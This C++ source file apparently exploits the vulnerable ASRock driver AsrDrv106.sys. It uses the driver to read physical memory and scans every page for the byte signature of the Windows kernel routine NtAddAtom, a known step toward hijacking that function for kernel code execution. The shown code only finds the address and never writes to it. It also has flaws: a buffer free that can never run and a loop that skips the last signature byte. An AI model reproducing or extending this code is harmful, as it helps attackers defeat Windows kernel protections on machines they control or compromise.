#include <iostream>
#include <unordered_map>
#include "asrdrv.hpp"
#include "util.hpp"

std::uintptr_t scan_page()
{
	return 0;
}

int main()
{
	std::uint8_t nt_add_atom_sig[17]  = { 0x48, 0x83, 0xEC, 0x28, 0x45, 0x33, 0xC9, 0xE8, 0x94, 0x75, 0xDA, 0xFF, 0x48, 0x83, 0xC4, 0x28, 0xC3 };

	asr_drv asr{};
	if (!asr.open())
	{
		std::cout << "[ERROR] Failed to open handle to driver. Try running as Admin and makesure AsrDrv106.sys is loaded\n";
		system("pause");
		return -1;
	}

	std::cout << "Getting physical memory ranges\n";
	util::init_mem_ranges();
	std::uintptr_t nt_add_atom_phys_addr = 0;
	
	util::iterate_pages([&](uintptr_t page_address) -> bool {
		std::uint8_t* buffer = nullptr;

		asr.read_phys_mem(page_address + 0xC60, 0x20, &buffer);

		if (buffer[0] == nt_add_atom_sig[0])
		{
			for (std::uint32_t x{ 0 }; x < sizeof nt_add_atom_sig; ++x)
			{
				if (x == 16)
				{
					nt_add_atom_phys_addr = page_address + 0xC60;
					return true;
				}
					
				if (buffer[x] == nt_add_atom_sig[x])
				{
					continue;
				}

				return false;
			}
		}
		return false;
		

		delete[] buffer;
	});
		

	asr.close();

	system("pause");
	
	return 0;
}
